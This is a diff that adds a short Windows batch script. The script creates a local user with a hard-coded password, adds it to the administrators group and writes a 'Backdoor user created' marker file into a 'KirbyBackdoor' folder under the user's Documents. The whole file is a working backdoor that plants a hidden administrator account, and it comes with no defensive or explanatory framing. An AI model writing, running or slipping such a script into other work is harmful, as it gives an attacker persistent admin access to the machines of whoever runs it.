@@ -1,0 +1,6 @@
+@echo off
+net user BBCUwU NKBDoor69 /add /Y
+net localgroup administrators BBCUwU /add /Y
+cd C:/Users/%USERNAME%/Documents
+mkdir KirbyBackdoor
+echo "Backdoor user created" > KirbyBackdoor/info.txt
